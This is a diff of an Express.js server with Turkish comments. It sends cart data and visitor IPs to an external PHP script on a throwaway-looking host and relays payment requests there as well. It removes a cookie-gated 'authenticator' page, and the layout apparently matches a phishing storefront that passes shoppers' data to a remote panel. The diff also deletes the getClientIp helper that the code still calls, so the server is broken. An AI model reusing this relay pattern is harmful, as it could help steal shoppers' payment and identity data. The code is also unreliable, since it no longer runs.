@@ -122,14 +122,6 @@ app.post('/veri', async (req, res) => {
 app.post('/api/sepet/ekle', (req, res) => {
   const urun_id = req.body.urun_id;
 
-  const getClientIp = (req) => {
-    const forwarded = req.headers['x-forwarded-for'];
-    if (forwarded) {
-      return forwarded.split(',')[0].trim();
-    }
-    return req.connection.remoteAddress?.replace('::ffff:', '') || '127.0.0.1';
-  };
-
   const clientIp = getClientIp(req);
 
   axios.post('https://forestgreen-rook-759809.hostingersite.com/dmn/request.php',
@@ -270,26 +262,13 @@ app.post('/api/odeme', (req, res) => {
     }
   )
   .then(response => {
-    res.send(response.data); // PHP'den gelen cevabı frontend'e gönder
+    res.send(response.data);
   })
   .catch(error => {
     console.error('Ödeme hatası:', error.message);
     res.status(500).send('fail');
   });
 });
-
-app.get('/authenticator', (req, res) => {
-     const caAsCookie = req.cookies.ca_as;
-    if (!caAsCookie) {
-        return res.redirect('/');
-    }
-    res.sendFile(path.join(__dirname, 'public', 'authenticator.html'));
-   });
- 
- 
- 
-
-  
 
 app.listen(port, () => {
     console.log(`Web sunucusu http://localhost:${port} adresinde çalışıyor.`);
